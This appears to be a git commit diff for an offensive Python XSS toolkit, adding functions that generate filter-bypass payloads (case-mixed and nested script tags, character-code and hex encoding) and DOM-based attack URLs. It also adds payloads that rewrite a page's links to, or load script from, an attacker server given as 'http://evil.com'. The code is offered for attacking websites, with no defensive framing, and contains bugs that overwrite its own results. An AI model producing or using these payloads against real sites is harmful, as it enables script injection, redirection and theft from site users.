18f2e664fa5dd6f2125ea5cfa83d507260f4c617
Arshia <35062789+Arshiaprg@users.noreply.github.com>
2019-07-20 23:25:13 -0700

    Add files via upload

--- kms/bypass.py
+++ kms/bypass.py
@@ -1,50 +1,90 @@
-import kms
+import codecs
+import html
+from .get_char_code import *
+from .functions import *
+from .classes import *
 
-cmd = ""
-while True:
+def xss_reflected_bypass(string):
+    a = []
+    all = []
+    ############################################
+    #A Method To Bypass Policy.
+    a.append(string.replace("<script>","<<ScRipT>").replace("</script>","//<</sCrIPt>"))
+    ############################################
+    #Bypass Wthen (") Character Is Filtered.
+    #Example:
+    #<script>alert('test');</script>
+    #And Bypass Like That:
+    #<script>alert(String.fromCharCode(116 101 115 116));</script>
+    a.append(from_char_code(string))
+    ############################################
+    #A Method To Bypass Policy.
+    ans = '<IMG """>' + string + '">'
+    ans = ans.lower().replace('<script>','<SCRIPT>')
+    ans = ans.lower().replace('</script>','</SCRIPT>')
+    a.append(ans)
+    ############################################
+    #A Method To Bypass Policy.
+    a.append("<sCr" + string + "IpT>")
+    ############################################
+    #A Method To Bypass Policy.
+    a.append(string.lower().replace("<script>","<ScR<script>Ipt>"))
+    ############################################
+    #Helps You To Bypass With Obfuscation.
+    a.append("Obfuscate Your Code Here : http://dean.edwards.name/packer/")
+    ############################################
+    #A Method To Bypass Policy.
+    a.append("\">" + string.replace("\"","\\").replace("\'","\\"))
+    ############################################
+    #A Method To Bypass Policy.
+    last_str = string.replace("<script>","<script&param=>").replace("</script>","</&param=script>")
+    a.append("You Should Replace 'param' With Target Variable :" + last_str)
+    ############################################
+    #Encode Symbols Of String To Hexadecimal
+    a = xss()
+    a.append(encode_symbol_hexadecimal(string))
+    ############################################
+    #Double Encode Symbols Of String To Hexadecimal
+    a = xss()
+    a.append(double_encode_symbol_hexadecimal(string))
+    ############################################
+    return a
 
-    print("""\033[1;36;[1] -> XSS Reflected Bypass
-    \033[1;36;[2] -> XSS DOM Based Bypass
-    \033[1;36;[3] -> Some XSS Ready Exploits
+#Enter Your Server Link Like That:
+#http://evil.com
+def xss_exploits(link):
+    a = []
+    ############################################
+    #A Method That Change Link Of A Website To Your Evil Server.
+    a.append("<script>window.onload = function() {var AllLinks=document.getElementsByTagName(\"a\");\
+    AllLinks[0].href = \"" + link + "\"; }</script> ")
+    ############################################
+    #A Method To Bypass Policy.
+    a.append("<SCRIPT%20a=\">\"%20SRC=\"" + link + "\"></SCRIPT>")
+    ############################################
+    return a
 
-    [99] -> exit
-    \033[1;37;""")
-
-    #Get Input
-    cmd = input(">> ")
-
-    #Exit If cmd Is 99{Exit}
-    if cmd == "99":
-        break
-
-    #XSS Reflected Bypass
-    if cmd == "1":
-        #Get String That Contains A Javascript Code.
-        str = input("Enter Your String : ")
-        #Get All Of Bypassed Strings And Print Them One By One In Green Color.
-        for i in kms.xss_reflected_bypass(str):
-            print("\033[1;31;[+] -> " + i + "\033[1;37;")
-        a = kms.xss()
-        print(a.encode_symbol_hexadecimal(str))
-        print(a.double_encode_symbol_hexadecimal(str))
-
-    #XSS DOM Based Bypass
-    elif cmd == "2":
-        #Get The Target
-        target = input("Enter Your Target : ")
-        #Get The Exploit String
-        exploit_string = input("Enter Your Exploit String : ")
-        #Get Some Ready Exploits From KMS Library.
-        for i in kms.xss_dom_bypass(target,exploit_string):
-            print("\033[1;31;[+] -> " + i + "\033[1;37;")
-
-    #XSS Ready Exploits
-    elif cmd == "3":
-        #Get String Evil Server Link.
-        server_link = input("Enter Your Evil Server Link : ")
-        #Get Some Ready Exploits From KMS Library.
-        for i in kms.xss_exploits(str):
-            print("\033[1;31;[+] -> " + i + "\033[1;37;")
-
-    else:
-        print("\033[1;31;You Entered Wrong Command!\033[1;37;")
+#Enter Taget With This Syntax:
+#http://vulnerable.com/vul.html?default=something
+#Important To Get Target Site Until '='
+#Enter String Like That:
+#<script>Your Code</script>
+def xss_dom_bypass(target,exploit_string):
+    a = []
+    ############################################
+    # Variables
+    #Get The Key Of Vulnerable Site.
+    #For Example Get 'name' In This Case:
+    #http://vulnerable.com/vul.html?name=something
+    key = target.split("?")[-1].split("=")[0]
+    #Get The Target Url
+    url = target.split("?")[0]
+    ############################################
+    #A Method That Just Add # To The First Of Exploit String.
+    a.append(target + "#" + exploit_string)
+    ############################################
+    #A Mathod To Bypass Policy
+    ready_string = url + "?payload=" + key + "=" + exploit_string + "&" + key + "=something"
+    a.append(ready_string)
+    ############################################
+    return a
